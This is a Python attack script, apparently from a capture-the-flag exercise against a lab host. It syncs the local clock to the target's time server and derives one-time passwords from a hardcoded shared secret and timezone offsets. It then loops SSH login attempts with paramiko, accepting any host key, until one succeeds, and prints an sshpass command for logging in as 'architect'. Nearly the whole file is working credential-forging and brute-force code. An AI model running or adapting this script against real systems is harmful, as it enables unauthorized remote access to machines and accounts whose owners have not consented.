from datetime import datetime, timedelta
import time
import subprocess
from hashlib import sha256
import random
import sys
import paramiko
from time import ctime
import ntplib
import time
import os

# NOTE: modified from: https://raw.githubusercontent.com/GeardoRanger/M4tr1xBrute/main/M4tr1xBrute.py

#shared secret token for OTP calculation
SHARED_SECRET_KEY = 792513759492579
USER = "architect"
RHOST = "10.10.27.142"

try:
    import ntplib
    client = ntplib.NTPClient()
    response = client.request(RHOST) #IP of linux-bay server
    print(response)
    os.system('date ' + time.strftime('%m%d%H%M%Y.%S',time.localtime(response.tx_time)))
except:
    print('Could not sync with time server.')
    sys.exit()

print('\nTime Sync Completed Successfully.\nConducting brute-force on OTP\n')

def TimeSet(country, hours, mins, seconds):
    now = datetime.now() + timedelta(hours=hours, minutes=mins)
    CurrentTime = int(now.strftime("%d%H%M"))
    return(CurrentTime)

def getOTP():
    ca = ('Ukraine', TimeSet('Ukraine', 4, 43, 1))
    cd = ('Nigeria', TimeSet('Nigeria', 1, 6, 1))
    ce = ('Denmark', TimeSet('Denmark', -5, 18, 1))
    
    t1_countryname, t1_value = ca
    t2_countryname, t2_value = cd
    t3_countryname, t3_value = ce
    
    ctt = t1_value * t2_value * t3_value
    uc = ctt ^ SHARED_SECRET_KEY
    hc = (sha256(repr(uc).encode('utf-8')).hexdigest())
    t = hc[22:44]
    
    return t, t1_countryname, t2_countryname, t3_countryname

while True:
    OTP, t1_countryname, t2_countryname, t3_countryname = getOTP()
    print(OTP)
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(RHOST, username=USER, password=OTP)
        print(f"Success with: {OTP}\n")
        print(f"pre-shared secret key: {SHARED_SECRET_KEY}")
        print(f"timezones: {t1_countryname}, {t2_countryname}, {t3_countryname}")
        
        #OTP = bytes(str(OTP), encoding='utf-8')
        #RHOST = bytes(str(RHOST), encoding='utf-8')
        #output = subprocess.getoutput(f'gnome-terminal -x bash -c "sshpass -p {OTP} ssh {USER}@{RHOST}"')
        #exec(output)
        print(f"Execute this command: sshpass -p \'{OTP}\' ssh architect@{RHOST}\n\n You have 60 seconds or less to run this command.")
        sys.exit()
    except Exception as ex:
        print(f"Connection failed with: {OTP}, trying again\n")
        continue
